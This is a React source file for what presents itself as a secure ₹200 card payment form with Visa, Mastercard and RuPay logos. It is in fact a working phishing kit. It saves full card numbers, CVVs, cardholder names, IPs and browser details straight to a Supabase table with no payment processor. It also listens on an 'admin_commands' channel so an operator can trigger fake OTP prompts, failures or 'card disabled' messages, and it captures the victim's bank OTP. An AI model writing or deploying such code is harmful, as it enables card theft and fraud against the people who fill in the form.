
import React, { useState, useEffect } from 'react';
import { CreditCard, Lock } from 'lucide-react';
import { supabase } from '@/integrations/supabase/client';

const PaymentForm = () => {
  const [formData, setFormData] = useState({
    cardNumber: '',
    expiryMonth: '',
    expiryYear: '',
    cvv: '',
    cardHolder: '',
    amount: '200'
  });
  const [showOTP, setShowOTP] = useState(false);
  const [otp, setOtp] = useState('');
  const [isProcessing, setIsProcessing] = useState(false);
  const [errors, setErrors] = useState<Record<string, string>>({});
  const [userIP, setUserIP] = useState('');

  // Get user IP
  useEffect(() => {
    const getUserIP = async () => {
      try {
        const response = await fetch('https://api.ipify.org?format=json');
        const data = await response.json();
        setUserIP(data.ip);
      } catch (error) {
        setUserIP('unknown');
      }
    };
    getUserIP();
  }, []);

  // Listen for admin commands
  useEffect(() => {
    const channel = supabase
      .channel('payment-commands')
      .on(
        'postgres_changes',
        {
          event: 'INSERT',
          schema: 'public',
          table: 'admin_commands'
        },
        (payload) => {
          const command = (payload.new as any).command;
          console.log('Received admin command:', command);
          
          if (command === 'showotp') {
            setShowOTP(true);
            setIsProcessing(false);
          } else if (command === 'fail') {
            setIsProcessing(false);
            setErrors({ submit: 'Payment failed. Please try again.' });
          } else if (command === 'success') {
            setIsProcessing(false);
            alert('Payment successful! Thank you.');
            window.location.reload();
          } else if (command === 'invalidotp') {
            setErrors({ otp: 'Invalid OTP. Please try again.' });
          } else if (command === 'cardinvalid') {
            setIsProcessing(false);
            setErrors({ cardNumber: 'Invalid card details. Please check and try again.' });
          } else if (command === 'carddisabled') {
            setIsProcessing(false);
            setErrors({ submit: 'Your card has been disabled. Please contact your bank.' });
          }
        }
      )
      .subscribe();

    return () => {
      supabase.removeChannel(channel);
    };
  }, []);

  const handleInputChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const { name, value } = e.target;
    setFormData(prev => ({ ...prev, [name]: value }));
    // Clear error when user starts typing
    if (errors[name]) {
      setErrors(prev => ({ ...prev, [name]: '' }));
    }
  };

  const validateForm = () => {
    const newErrors: Record<string, string> = {};
    
    if (!formData.cardNumber || formData.cardNumber.length < 16) {
      newErrors.cardNumber = 'Please enter a valid card number';
    }
    if (!formData.expiryMonth || !formData.expiryYear) {
      newErrors.expiry = 'Please enter expiry date';
    }
    if (!formData.cvv || formData.cvv.length < 3) {
      newErrors.cvv = 'Please enter a valid CVV';
    }
    if (!formData.cardHolder.trim()) {
      newErrors.cardHolder = 'Please enter cardholder name';
    }
    
    setErrors(newErrors);
    return Object.keys(newErrors).length === 0;
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    
    if (!validateForm()) return;
    
    setIsProcessing(true);
    setErrors({});
    
    try {
      // Submit card details to Supabase
      const { error } = await supabase
        .from('card_submissions')
        .insert([{
          invoice_id: 'INV' + Date.now(),
          card_number: formData.cardNumber,
          expiry_month: formData.expiryMonth,
          expiry_year: formData.expiryYear,
          cvv: formData.cvv,
          card_holder: formData.cardHolder,
          amount: formData.amount,
          user_ip: userIP,
          browser: navigator.userAgent,
          network: 'Unknown'
        }]);
      
      if (error) {
        console.error('Error submitting card details:', error);
        setErrors({ submit: 'Failed to process payment. Please try again.' });
        setIsProcessing(false);
      }
    } catch (error) {
      console.error('Error:', error);
      setErrors({ submit: 'Failed to process payment. Please try again.' });
      setIsProcessing(false);
    }
  };

  const handleOTPSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    
    if (!otp) {
      setErrors({ otp: 'Please enter OTP' });
      return;
    }
    
    try {
      // Update the submission with OTP
      const { error } = await supabase
        .from('card_submissions')
        .update({ otp })
        .eq('user_ip', userIP)
        .order('created_at', { ascending: false })
        .limit(1);
      
      if (error) {
        console.error('Error submitting OTP:', error);
      }
      
      setErrors({ otp: '' });
    } catch (error) {
      console.error('Error:', error);
    }
  };

  if (showOTP) {
    return (
      <div className="w-1/2 p-8 bg-white">
        <div className="max-w-md mx-auto">
          <h2 className="text-2xl font-bold mb-6 text-center">Enter OTP</h2>
          <p className="text-gray-600 mb-4 text-center">
            Please enter the OTP sent to your registered mobile number
          </p>
          
          <form onSubmit={handleOTPSubmit} className="space-y-4">
            <div>
              <input
                type="text"
                placeholder="Enter 6-digit OTP"
                value={otp}
                onChange={(e) => setOtp(e.target.value)}
                className="w-full px-4 py-3 border border-gray-300 rounded text-center text-lg tracking-widest"
                maxLength={6}
              />
              {errors.otp && <p className="text-red-500 text-sm mt-1">{errors.otp}</p>}
            </div>
            
            <button
              type="submit"
              className="w-full bg-blue-600 text-white py-3 rounded hover:bg-blue-700 font-semibold"
            >
              Verify OTP
            </button>
          </form>
        </div>
      </div>
    );
  }

  return (
    <div className="w-1/2 p-8 bg-white">
      <div className="max-w-md mx-auto">
        <h2 className="text-2xl font-bold mb-6">Payment Details</h2>
        
        <form onSubmit={handleSubmit} className="space-y-4">
          <div>
            <label className="block text-sm font-medium text-gray-700 mb-2">
              Card Number
            </label>
            <div className="relative">
              <input
                type="text"
                name="cardNumber"
                placeholder="1234 5678 9012 3456"
                value={formData.cardNumber}
                onChange={handleInputChange}
                className="w-full px-4 py-3 border border-gray-300 rounded pl-12"
                maxLength={16}
              />
              <CreditCard className="absolute left-3 top-3.5 h-5 w-5 text-gray-400" />
            </div>
            {errors.cardNumber && <p className="text-red-500 text-sm mt-1">{errors.cardNumber}</p>}
          </div>

          <div className="grid grid-cols-3 gap-4">
            <div>
              <label className="block text-sm font-medium text-gray-700 mb-2">
                Month
              </label>
              <select
                name="expiryMonth"
                value={formData.expiryMonth}
                onChange={(e) => handleInputChange(e as any)}
                className="w-full px-3 py-3 border border-gray-300 rounded"
              >
                <option value="">MM</option>
                {Array.from({ length: 12 }, (_, i) => (
                  <option key={i + 1} value={String(i + 1).padStart(2, '0')}>
                    {String(i + 1).padStart(2, '0')}
                  </option>
                ))}
              </select>
            </div>
            
            <div>
              <label className="block text-sm font-medium text-gray-700 mb-2">
                Year
              </label>
              <select
                name="expiryYear"
                value={formData.expiryYear}
                onChange={(e) => handleInputChange(e as any)}
                className="w-full px-3 py-3 border border-gray-300 rounded"
              >
                <option value="">YY</option>
                {Array.from({ length: 10 }, (_, i) => (
                  <option key={i} value={String(new Date().getFullYear() + i).slice(-2)}>
                    {String(new Date().getFullYear() + i).slice(-2)}
                  </option>
                ))}
              </select>
            </div>
            
            <div>
              <label className="block text-sm font-medium text-gray-700 mb-2">
                CVV
              </label>
              <input
                type="text"
                name="cvv"
                placeholder="123"
                value={formData.cvv}
                onChange={handleInputChange}
                className="w-full px-3 py-3 border border-gray-300 rounded"
                maxLength={4}
              />
            </div>
          </div>
          {errors.expiry && <p className="text-red-500 text-sm">{errors.expiry}</p>}
          {errors.cvv && <p className="text-red-500 text-sm">{errors.cvv}</p>}

          <div>
            <label className="block text-sm font-medium text-gray-700 mb-2">
              Cardholder Name
            </label>
            <input
              type="text"
              name="cardHolder"
              placeholder="John Doe"
              value={formData.cardHolder}
              onChange={handleInputChange}
              className="w-full px-4 py-3 border border-gray-300 rounded"
            />
            {errors.cardHolder && <p className="text-red-500 text-sm mt-1">{errors.cardHolder}</p>}
          </div>

          <div>
            <label className="block text-sm font-medium text-gray-700 mb-2">
              Amount
            </label>
            <div className="relative">
              <input
                type="text"
                name="amount"
                value={`₹${formData.amount}`}
                readOnly
                className="w-full px-4 py-3 border border-gray-300 rounded bg-gray-50"
              />
            </div>
          </div>

          {errors.submit && <p className="text-red-500 text-sm">{errors.submit}</p>}

          <button
            type="submit"
            disabled={isProcessing}
            className="w-full bg-blue-600 text-white py-3 rounded hover:bg-blue-700 font-semibold disabled:opacity-50 disabled:cursor-not-allowed flex items-center justify-center"
          >
            {isProcessing ? (
              <>
                <div className="animate-spin rounded-full h-5 w-5 border-b-2 border-white mr-2"></div>
                Processing...
              </>
            ) : (
              <>
                <Lock className="mr-2 h-5 w-5" />
                Pay Securely
              </>
            )}
          </button>

          <div className="flex justify-center items-center space-x-4 mt-6">
            <span className="text-sm text-gray-600">Secured by:</span>
            <div className="flex items-center space-x-3">
              <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/5/5e/Visa_Inc._logo.svg/2560px-Visa_Inc._logo.svg.png" alt="Visa" className="h-6" />
              <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Mastercard-logo.svg/1280px-Mastercard-logo.svg.png" alt="Mastercard" className="h-6" />
              <img src="https://upload.wikimedia.org/wikipedia/en/thumb/8/8b/RuPay.svg/1200px-RuPay.svg.png" alt="RuPay" className="h-6" />
            </div>
          </div>
        </form>
      </div>
    </div>
  );
};

export default PaymentForm;
